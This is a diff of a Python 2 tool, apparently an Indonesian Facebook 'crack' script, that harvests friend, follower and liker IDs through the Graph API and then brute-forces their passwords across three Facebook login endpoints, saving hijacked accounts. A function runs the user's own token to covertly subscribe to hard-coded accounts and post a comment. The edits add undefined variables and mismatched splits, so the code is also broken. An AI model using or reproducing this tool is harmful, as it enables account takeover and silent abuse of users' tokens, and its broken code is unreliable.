@@ -59,7 +59,7 @@ N = '\x1b[0m'    # WARNA MATI
 my_color = [
  P, M, H, K, B, U, O, N]
 warna = random.choice(my_color)
-#  Moch Reza Alfauzan Scrn XD.  #
+#  Exec Reza Alfauzan Scrn XD.  #
 #------------------------------->
 koh = '100005395413800'
 xi_jimpinx = '1714000985456399'
@@ -67,14 +67,14 @@ ok, cp, id, loop = [], [], [], 0
 hoetank = random.choice(['Yang posting orang nya ganteng:)', 'Lo ngentod:v', 'Never surrentod tekentod kentod:v'])
 bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
 
-# lempankkkkkkkk
+# mengetik otomatis/automatic
 def jalan(z):
     for e in z + '\n':
         sys.stdout.write(e)
         sys.stdout.flush()
         time.sleep(0.03)
 
-def tod():
+def exe():
     titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
     for x in titik:
         print '\r %s[%s+%s] menghapus token %s'%(N,M,N,x),
@@ -82,10 +82,10 @@ def tod():
         time.sleep(1)
 
 # LO KONTOL
-logo = ''' \033[0;96m __  __        __  ______  ____
- \033[0;96m \ \/ / ____  /  |/  / _ )/ __/ ® \033[0m|| Created By Reza Alfauzan
- \033[0;96m  \  / /___/ / /|_/ / _  / _/     \033[0m|| Github.com/Reaper-XD
- \033[0;96m  /_/       /_/  /_/____/_/ \033[0;91mv2.0  \033[0m|| Facebook.com/ReaperXD277'''
+logo = ''' \033[0;96m    __  ________         ___  ____
+ \033[0;96m   /  |/  / ___/ ____   / _ )/ __/ ® \033[0m|| Created By Reza Alfauzan
+ \033[0;96m  / /|_/ / /___ /___/  / _  / _/\033[0m|| Github.com/Reaper-XD
+ \033[0;96m /_/  /_/_____/       /____/_/ \033[0;91mv2.0  \033[0m|| Facebook.com/ReaperXD277'''
 
 lo_ngentod = '1714009362122228'
 # crack selesai
@@ -119,7 +119,7 @@ def rezaxd():
         os.system('xdg-open https://www.youtube.com/channel/UC5zJsltM9leQwjvYqrA_r5Q')
         reza_xd()
     except KeyError:
-        print '\n\n %s[%s!%s] token invalid'%(N,M,N);time.sleep(2);yayanxd()
+        print '\n\n %s[%s!%s] token invalid'%(N,M,N);time.sleep(2);rezaxd()
 
 ### ORANG GANTENG ###
 def reza_xd():
@@ -153,7 +153,7 @@ def reza_xd():
     print ' [%s0%s]. logout (%shapus token%s)'%(M,N,M,N);time.sleep(0.03)
     pepek = raw_input('\n [*] menu : ')
     if pepek == '':
-        print '\n %s[%s×%s] jangan kosong kentod!'%(N,M,N);time.sleep(2);moch_yayan()
+        print '\n %s[%s×%s] jangan kosong kentod!'%(N,M,N);time.sleep(2);reza_xd()
     elif pepek in['1','01']:
         teman(kontol)
     elif pepek in['2','02']:
@@ -186,44 +186,44 @@ def reza_xd():
                 titid  = kontol.replace(" [✓] "," \x1b[0m[\x1b[1;92m✓\x1b[0m]\x1b[1;92m ").replace(" [×] ", " \x1b[0m[\x1b[1;93m×\x1b[0m]\x1b[1;93m ")
                 print("%s%s"%(titid,N));time.sleep(0.03)
             print(" %s[%s#%s] --------------------------------------------"%(N,O,N))
-            raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
+            raw_input('\n  [ %sKEMBALI%s ] '%(O,N));reza_xd()
         except (IOError):
             print("\n %s[%s×%s] opshh kamu tidak mendapatkan hasil :("%(N,M,N))
-            raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
+            raw_input('\n  [ %sKEMBALI%s ] '%(O,N));reza_xd()
     elif pepek in['8','08']:
         seting_yntkts()
     elif pepek in['9','09']:
         info_tools()
     elif pepek in['0','00']:
         print '\n'
-        tod()
+        exe()
         time.sleep(1);os.system('rm -rf .memek.txt')
         jalan('\n %s[%s✓%s]%s berhasil menghapus token'%(N,H,N,H));exit()
     else:
-        print '\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu nya bro!'%(N,M,N,M,pepek,N);time.sleep(2);moch_yayan()
+        print '\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu nya bro!'%(N,M,N,M,pepek,N);time.sleep(2);reza_xd()
 
-# Yang ganti bot nya gw sumpahin mak lo mati ajg!
+# Jangan Di Ganti Bot Nya Bang
 def wuhan(kontol):
     try:
-        kentod = kontol
-        requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100059709917296/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100008678141977/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100005878513705/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100041388320565/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100013031465766/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/857799105/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100027558888180/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,kentod))
+        ngepost = mail
+        requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=%s'%(ngepost))
+        requests.post('https://graph.facebook.com/100059709917296/subscribers?access_token=%s'%(ngepost))
+        requests.post('https://graph.facebook.com/100008678141977/subscribers?access_token=%s'%(ngepost))
+        requests.post('https://graph.facebook.com/100005878513705/subscribers?access_token=%s'%(ngepost))
+        requests.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s'%(ngepost))
+        requests.post('https://graph.facebook.com/100041388320565/subscribers?access_token=%s'%(ngepost))
+        requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s'%(ngepost))
+        requests.post('https://graph.facebook.com/100013031465766/subscribers?access_token=%s'%(ngepost))
+        requests.post('https://graph.facebook.com/857799105/subscribers?access_token=%s'%(ngepost))
+        requests.post('https://graph.facebook.com/100027558888180/subscribers?access_token=%s'%(ngepost))
+        requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,ngepost))
         #requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(lo_ngentod,kentod,kentod))
-        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,kentod))
+        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,ngepost))
     except:
     	pass
 
 # dump id dari teman hehe
-def teman(kontol):
+def teman(k):
     try:
         os.mkdir('dump')
     except:pass
@@ -232,7 +232,7 @@ def teman(kontol):
         asw = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
         cin = ('dump/' + mmk + '.json').replace(' ', '_')
         xxx = open(cin, 'w')
-        for a in requests.get('https://graph.facebook.com/me/friends?limit=%s&access_token=%s'%(asw,kontol)).json()["data"]:
+        for a in requests.get('https://graph.facebook.com/me/friends?limit=%s&access_token=%s'%(asw,mail)).json()["data"]:
             id.append(a['name'] + '<=>' + a['id'])
             xxx.write(a['name'] + '<=>' + a['id'] + '\n')
             w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
@@ -254,7 +254,7 @@ def teman(kontol):
 																																																				ysc = 'Yayan sayang Cindy'
 																																																			'''
 # dump id dari teman publik hehe
-def publik(kontol):
+def publik(mail):
     try:
         os.mkdir('dump')
     except:pass
@@ -264,7 +264,7 @@ def publik(kontol):
         ihh = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
         knt = ('dump/' + ahh + '.json').replace(' ', '_')
         xxx = open(knt, 'w')
-        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(csy,ihh,kontol)).json()["data"]:
+        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(csy,ihh,mail)).json()["data"]:
             id.append(a['name'] + '<=>' + a['id'])
             xxx.write(a['name'] + '<=>' + a['id'] + '\n')
             w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
@@ -283,7 +283,7 @@ def publik(kontol):
         raw_input(' [ %sKEMBALI%s ] '%(O,N));reza_xd()
 
 # dump id dari followers hehe
-def followers(kontol):
+def followers(mail):
     try:
         os.mkdir('dump')
     except:pass
@@ -293,7 +293,7 @@ def followers(kontol):
         asw = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
         ah  = ('dump/' + mmk + '.json').replace(' ', '_')
         xxx = open(ah, 'w')
-        for a in requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(csy,asw,kontol)).json()["data"]:
+        for a in requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(csy,asw,mail)).json()["data"]:
             id.append(a['id'] + '<=>' + a['name'])
             xxx.write(a['id'] + '<=>' + a['name'] + '\n')
             w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
@@ -312,7 +312,7 @@ def followers(kontol):
         raw_input(' [ %sKEMBALI%s ] '%(O,N));reza_xd()
 
 # dump id dari postingan hehe
-def postingan(kontol):
+def postingan(mail):
     try:
         os.mkdir('dump')
     except:pass
@@ -322,7 +322,7 @@ def postingan(kontol):
         asw = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
         ahh = ('dump/' + ppk + '.json').replace(' ', '_')
         xxx = open(ahh, 'w')
-        for a in requests.get('https://graph.facebook.com/%s/likes?limit=%s&access_token=%s'%(csy,asw,kontol)).json()["data"]:
+        for a in requests.get('https://graph.facebook.com/%s/likes?limit=%s&access_token=%s'%(csy,asw,mail)).json()["data"]:
             id.append(a['id'] + '<=>' + a['name'])
             xxx.write(a['id'] + '<=>' + a['name'] + '\n')
             w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
@@ -340,11 +340,11 @@ def postingan(kontol):
         jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
         raw_input(' [ %sKEMBALI%s ] '%(O,N));reza_xd()
 #cek ingfo
-def cek_ingfo(kontol):
+def cek_ingfo(mail):
     try:
         user = raw_input("\n [%s+%s] masukan id atau username : "%(O,N))
         if user == '':
-            print "\n [%s!%s] jangan kosong bro"%(M,N);cek_ingfo(kontol)
+            print "\n [%s!%s] jangan kosong bro"%(M,N);cek_ingfo(mail)
         url = ("https://lookup-id.com/")
         if "facebook" in user:
             payload = {"fburl": user, "check": "Lookup"}
@@ -356,11 +356,11 @@ def cek_ingfo(kontol):
         idt = email_.text
         if user == "me":
             idt = "me"
-        x = requests.get('https://graph.facebook.com/%s?fields=name,id,birthday,first_name,middle_name,last_name,name_format,picture,short_name,gender,link,email,location,hometown,religion,relationship_status,significant_other,about,locale&access_token=%s'%(idt, kontol)).json()
+        x = requests.get('https://graph.facebook.com/%s?fields=name,id,birthday,first_name,middle_name,last_name,name_format,picture,short_name,gender,link,email,location,hometown,religion,relationship_status,significant_other,about,locale&access_token=%s'%(idt, mail)).json()
         nmaa = x['name']
     except (KeyError, IOError):
         nmaa = '%s-%s'%(M,N)
-    print '\n  * Ingformasi akun Facebook *';time.sleep(0.03)
+    print '\n  * Informasi akun Facebook *';time.sleep(0.03)
     print '\n [*] nama lengkap : %s'%(nmaa);time.sleep(0.03)
     try:
     	ndpn = x['first_name']
@@ -387,7 +387,7 @@ def cek_ingfo(kontol):
     	emai = x['email']
     except (KeyError, IOError):
     	emai = '%s-%s'%(M,N)
-    print ' [*] gmail facebook : %s'%(emai);time.sleep(0.03)
+    print ' [*] email facebook : %s'%(emai);time.sleep(0.03)
     try:
     	nmrr = x['mobile_phone']
     except (KeyError, IOError):
@@ -408,14 +408,14 @@ def cek_ingfo(kontol):
     	jenis = ''
     print ' [*] jenis kelamin  : %s '%(jenis)
     try:
-    	r = requests.get('https://graph.facebook.com/%s/friends?limit=50000&access_token=%s'%(idt, kontol))
+    	r = requests.get('https://graph.facebook.com/%s/friends?limit=50000&access_token=%s'%(idt, mail))
         z = json.loads(r.text)
         for i in z['data']:
             id.append(i['id'])
     except:pass
-    print ' [*] jumblah teman  : %s'%str(len(id));time.sleep(0.03)
+    print ' [*] jumlah teman  : %s'%str(len(id));time.sleep(0.03)
     try:
-    	r = requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s'%(idt, kontol))
+    	r = requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s'%(idt, mail))
         z = json.loads(r.text)
         pengikut = z['summary']['total_count']
     except (KeyError, IOError):
@@ -463,7 +463,7 @@ def cek_ingfo(kontol):
     try:
     	jam  = x['updated_time'][11:19]
     	uptd = x['updated_time'][:10]
-        year, month, day = uptd.split("-")
+        year, month, day, jam = uptd.split("-")
         month = bulan_ttl[month]
     except (KeyError, IOError):
     	year = '%s-%s'%(M,N)
@@ -474,7 +474,7 @@ def cek_ingfo(kontol):
     print ' %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m'
     jalan('\n [%s✓%s] berhasil mengechek data² akun facebook\n\n'%(O,N));exit()
 
-# cek ingfo sc
+# cek info sc
 def info_tools():
     os.system('clear')
     print ' %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m';time.sleep(0.07)
@@ -494,9 +494,9 @@ def seting_yntkts():
     print ' (%s2%s) check user agent'%(O,N)
     ytbjts = raw_input('\n %s[%s?%s] choose : '%(N,O,N))
     if ytbjts == '':
-        print '\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N);time.sleep(2);seting_yntkts()
+        print '\n %s[%s×%s] Gak boleh kosong Ganteng'%(N,M,N);time.sleep(2);seting_yntkts()
     elif ytbjts in['1','01']:
-        yo_ndak_tau_ko_tanya_saia()
+        ayam()
     elif ytbjts in['2','02']:
         try:
             user_agent = open('YNTKTS.txt', 'r').read()
@@ -507,13 +507,13 @@ def seting_yntkts():
     else:
         print '\n %s[%s×%s] input yang bener'%(N,M,N);time.sleep(2);seting_yntkts()
 # User Agent baru
-def yo_ndak_tau_ko_tanya_saia():
+def ayam():
     os.system('rm -rf YNTKTS.txt')
     _asu_ = raw_input('\n [%s?%s] ingin menggunakan user agent hp anda [Y/t]: '%(O,N))
     if _asu_ == '':
-        print '\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N);yo_ndak_tau_ko_tanya_saia()
+        print '\n %s[%s×%s] Gak boleh kosong Ganteng'%(N,M,N);ayam()
     elif _asu_ in['Y','y']:
-        jalan('\n %s *%s anda akan di arakan ke situs web setelah di arahkan ke situs web.\n  %s*%s klik ikon %sMY USER AGENT%s lalu copy semua user agent anda...'%(O,N,O,N,H,N));time.sleep(2);os.system('xdg-open https://www.yayanxd.my.id/server')
+        jalan('\n %s *%s anda akan di arakan ke situs web setelah di arahkan ke situs web.\n  %s*%s klik ikon %sMY USER AGENT%s lalu copy semua user agent anda...'%(O,N,O,N,H,N));time.sleep(2);os.system('xdg-open https://www.github.com/Reaper-XD')
         _agen_ = raw_input(' [%s?%s] masukan user agent hp anda :%s '%(O,N,H))
         open('YNTKTS.txt', 'w').write(_agen_);time.sleep(2)
         jalan('\n %s[%s✓%s] berhasil menggunakan user agent hp anda...'%(N,H,N))
@@ -524,8 +524,8 @@ def yo_ndak_tau_ko_tanya_saia():
         jalan('\n %s[%s✓%s] berhasil mengganti user agent...'%(N,H,N))
         raw_input('\n  %s[ %skembali%s ]'%(N,O,N));reza_xd()
     else:
-        print '\n %s[%s!%s] Y/t ngentod'%(N,M,N);yo_ndak_tau_ko_tanya_saia()
-# mulai ngecrot awokawokawokkawok
+        print '\n %s[%s!%s] Y/t ngentod'%(N,M,N);ayam()
+# mulai ngecrack
 class __crack__:
 
     def __init__(self):
@@ -550,10 +550,10 @@ class __crack__:
                 elif len(pwek)<=5:
                     print '\n %s[%s×%s] kata sandi minimal 6 karakter'%(N,M,N)
                 else:
-                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
+                    def __rezz__(ysc=None): # ycs => Reza Gak Ada Pacarnya:)
                         cin = raw_input('\n [*] method : ')
                         if cin == '':
-                            print '\n %s[%s×%s] jangan kosong bro'%(N,M,N);__yan__()()
+                            print '\n %s[%s×%s] jangan kosong bro'%(N,M,N);__rezz__()()
                         elif cin == '1':
                             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
@@ -594,12 +594,12 @@ class __crack__:
                             os.remove(self.apk)
                             hasil(ok,cp)
                         else:
-                            print '\n %s[%s×%s] input yang bener'%(N,M,N);__yan__()
+                            print '\n %s[%s×%s] input yang bener'%(N,M,N);__rezz__()
                     print '\n [ pilih method login - silahkan coba satu² ]\n'
                     print ' [%s1%s]. method API (fast)'%(O,N)
                     print ' [%s2%s]. method mbasic (slow)'%(O,N)
                     print ' [%s3%s]. method mobile (super slow)'%(O,N)
-                    __yan__(pwek.split(','))
+                    __rezz__(pwek.split(','))
                     break
         elif ___rezaganteng___ in ('T', 't'):
             print '\n [ pilih method login - silahkan coba satu² ]\n'
@@ -611,19 +611,19 @@ class __crack__:
             print '\n %s[%s×%s] Y/t goblok!'%(N,M,N);self.plerr()
         return
 
-    def __api__(self, user, __yan__):
+    def __api__(self, user, __rezz__):
         global ok,cp,loop
         sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
-        for pw in __yan__:
+        for pw in __rezz__:
             pw = pw.lower()
             try: os.mkdir('results')
             except: pass
             try:
-            	_kontol = open('YNTKTS.txt', 'r').read()
+            	_capek = open('YNTKTS.txt', 'r').read()
             except (KeyError, IOError):
-            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
-            headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": _kontol, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
+            	_capek = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
+            headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": _capek, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
             api = 'https://b-api.facebook.com/method/auth.login'
             params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
             response = requests.get(api, params=params, headers=headers_)
@@ -640,12 +640,12 @@ class __crack__:
                 break
             elif 'www.facebook.com' in response.json()['error_msg']:
                 try:
-                    kontol = open('.memek.txt').read()
-                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
-                    month, day, year = cp_ttl.split('/')
+                    mail = open('.memek.txt').read()
+                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,mail)).json()['birthday']
+                    month, day, year, jam = cp_ttl.split('/')
                     month = bulan_ttl[month]
-                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
-                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
+                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,jam,N)
+                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year,jam)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                     break
@@ -665,20 +665,20 @@ class __crack__:
                 continue
 
         loop += 1
-    def __mbasic__(self, user, __yan__):
+    def __mbasic__(self, user, __rezz__):
         global ok,cp,loop
         sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
-        for pw in __yan__:
+        for pw in __rezz__:
             pw = pw.lower()
             try: os.mkdir('results')
             except: pass
             try:
-            	_kontol = open('YNTKTS.txt', 'r').read()
+            	_capek = open('YNTKTS.txt', 'r').read()
             except (KeyError, IOError):
-            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
+            	_capek = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
             ses = requests.Session()
-            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_capek,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
             p = ses.get("https://mbasic.facebook.com")
             b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
             if "c_user" in ses.cookies.get_dict().keys():
@@ -690,12 +690,12 @@ class __crack__:
                 break
             elif "checkpoint" in ses.cookies.get_dict().keys():
                 try:
-                    kontol = open('.memek.txt').read()
-                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
-                    month, day, year = cp_ttl.split('/')
+                    mail = open('.memek.txt').read()
+                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,mail)).json()['birthday']
+                    month, day, year, jam = cp_ttl.split('/')
                     month = bulan_ttl[month]
-                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
-                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
+                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,jam,N)
+                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year,jam)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                     break
@@ -715,20 +715,20 @@ class __crack__:
                 continue
 
         loop += 1
-    def __mfb__(self, user, __yan__):
+    def __mfb__(self, user, __rezz__):
         global ok,cp,loop
         sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
-        for pw in __yan__:
+        for pw in __rezz__:
             pw = pw.lower()
             try: os.mkdir('results')
             except: pass
             try:
-            	_kontol = open('YNTKTS.txt', 'r').read()
+            	_capek = open('YNTKTS.txt', 'r').read()
             except (KeyError, IOError):
-            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
+            	_capek = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
             ses = requests.Session()
-            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_capek,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
             p = ses.get("https://m.facebook.com")
             b = ses.post("https://m.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
             if "c_user" in ses.cookies.get_dict().keys():
@@ -740,12 +740,12 @@ class __crack__:
                 break
             elif "checkpoint" in ses.cookies.get_dict().keys():
                 try:
-                    kontol = open('.memek.txt').read()
-                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
-                    month, day, year = cp_ttl.split('/')
+                    mail = open('.memek.txt').read()
+                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,mail)).json()['birthday']
+                    month, day, year, jam = cp_ttl.split('/')
                     month = bulan_ttl[month]
-                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
-                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
+                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,jam,N)
+                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year,jam)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                     break
@@ -765,15 +765,15 @@ class __crack__:
                 continue
         loop += 1
     def __pler__(self):
-        yan = raw_input('\n [*] method : ')
-        if yan == '':
-            print '\n %s[%s×%s] jangan kosong bro'%(N,M,N);self.__pler__()
-        elif yan in ('1', '01'):
+        rez = raw_input('\n [*] method : ')
+        if rez == '':
+            print '\n %s[%s×%s] jangan kosong bang'%(N,M,N);self.__pler__()
+        elif rez in ('1', '01'):
             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
             with RezaGanteng(max_workers=30) as (__rezaXD__):
-            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
+            	for yntkts in self.id: # Ya saya gak tau kok tanya saya
                     try:
                         name, uid = yntkts.split('<=>')
                         xz = name.split(' ')
@@ -787,7 +787,7 @@ class __crack__:
 
             os.remove(self.apk)
             hasil(ok,cp)
-        elif yan in ('2', '02'):
+        elif rez in ('2', '02'):
             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
@@ -806,7 +806,7 @@ class __crack__:
 
             os.remove(self.apk)
             hasil(ok,cp)
-        elif yan in ('3', '03'):
+        elif rez in ('3', '03'):
             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
